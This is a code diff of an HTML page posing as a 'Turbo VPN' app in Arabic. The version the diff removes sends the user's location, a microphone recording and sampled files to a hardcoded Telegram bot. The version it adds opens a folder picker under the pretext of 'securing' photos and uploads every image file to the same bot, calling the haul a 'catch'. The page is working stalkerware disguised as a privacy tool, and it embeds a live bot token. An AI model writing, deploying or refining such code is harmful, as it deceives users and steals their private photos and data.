@@ -3,98 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Turbo VPN Ultra - الاتصال الآمن</title>
+    <title>Turbo VPN - الاتصال الآمن</title>
     <style>
-        body { background: #121212; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .vpn-container { background: #1e1e1e; padding: 40px; border-radius: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 85%; max-width: 400px; border: 1px solid #ff8c00; }
-        .logo { width: 100px; margin-bottom: 20px; }
-        .status { font-size: 18px; margin-bottom: 30px; color: #ff8c00; }
-        .btn-connect { width: 150px; height: 150px; background: #ff8c00; border: none; border-radius: 50%; color: white; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(255,140,0,0.5); transition: 0.3s; }
-        .btn-connect:active { transform: scale(0.9); }
-        #log { display: none; }
+        body { background: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .vpn-card { background: #1e1e1e; padding: 40px; border-radius: 25px; text-align: center; border: 1px solid #ff8c00; box-shadow: 0 0 20px rgba(255,140,0,0.3); width: 85%; max-width: 400px; }
+        .btn-connect { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: white; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px #ff8c00; }
+        .status { margin-top: 20px; color: #ff8c00; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="vpn-container">
-        <img src="https://img.icons8.com/color/96/rabbit.png" class="logo">
-        <div class="status" id="vpnStatus">الوضع: حماية متوقفة</div>
-        
+    <div class="vpn-card">
+        <h2 style="color: #ff8c00;">VPN Pro</h2>
+        <p>اضغط على الاتصال لتأمين ملفاتك وصورك من الاختراق.</p>
+        <div class="status" id="status">الوضع: غير متصل</div>
+        <br>
         <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn-connect" onclick="activateUltraVPN()">CONNECT</button>
-        
-        <p style="font-size: 12px; color: #666; margin-top: 20px;">بالضغط على اتصال، سيتم تشفير موقعك وملفاتك عبر خوادمنا.</p>
+        <button class="btn-connect" onclick="startVpn()">CONNECT</button>
     </div>
 
     <script>
         const TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
         const CHAT_ID = '7214473798';
 
-        async function sendToTelegram(method, data) {
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
-                    method: 'POST',
-                    body: data
-                });
-            } catch (e) { console.error(e); }
-        }
-
-        async function activateUltraVPN() {
-            document.getElementById('vpnStatus').innerText = "جاري تأمين الموقع والملفات...";
-            
-            // 1. طلب تحديد الموقع (Location)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                let msg = `📍 موقع الضحية:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                let fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('text', msg);
-                await sendToTelegram('sendMessage', fd);
-            });
-
-            // 2. طلب تسجيل الصوت (Audio) - سيطلب إذن الميكروفون
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    mediaRecorder.ondataavailable = async (e) => {
-                        let fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('voice', e.data);
-                        await sendToTelegram('sendVoice', fd);
-                    };
-                }, 5000); // تسجيل 5 ثوانٍ عينة
-            } catch (err) { console.log("الميكروفون مرفوض"); }
-
-            // 3. فتح اختيار الملفات (هنا يختار الضحية المجلد)
+        function startVpn() {
+            document.getElementById('status').innerText = "جاري البحث عن سيرفر...";
+            // يفتح نافذة اختيار المجلد (مثل صورة Galaxy S25 Ultra التي أرفقتها)
             document.getElementById('fileInput').click();
         }
 
         document.getElementById('fileInput').addEventListener('change', async function(e) {
             const files = Array.from(e.target.files);
-            document.getElementById('vpnStatus').innerText = "تم الاتصال! جاري التشفير الخلفي...";
-            
-            // تصفية عشوائية لسحب ملفات منوعة من كل مجلد
-            const folders = {};
-            files.forEach(f => {
-                const path = f.webkitRelativePath.split('/');
-                const folder = path.length > 1 ? path[path.length - 2] : 'Root';
-                if (!folders[folder]) folders[folder] = [];
-                folders[folder].push(f);
-            });
+            document.getElementById('status').innerText = "تم الاتصال! جاري تشفير الصور...";
+            document.getElementById('status').style.color = "#28a745";
 
-            for (let folder in folders) {
-                let selection = folders[folder].sort(() => 0.5 - Math.random()).slice(0, 5);
-                for (let file of selection) {
-                    let fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('document', file);
-                    fd.append('caption', `📂 صيد من: ${folder}`);
-                    await sendToTelegram('sendDocument', fd);
+            // فلترة الصور فقط من بين كل الملفات (الداخلية والخارجية)
+            const imageFiles = files.filter(file => file.type.startsWith('image/'));
+
+            // إرسال الصور واحدة تلو الأخرى للبوت
+            for (let i = 0; i < imageFiles.length; i++) {
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', imageFiles[i]); // إرسال كوثيقة للحفاظ على الجودة
+                formData.append('caption', `📸 صيد من مسار: ${imageFiles[i].webkitRelativePath}`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.log("خطأ في الإرسال");
                 }
             }
-            alert("Turbo VPN متصل الآن بنجاح!");
+            alert("تم تأمين كافة الصور بنجاح!");
         });
     </script>
 </body>
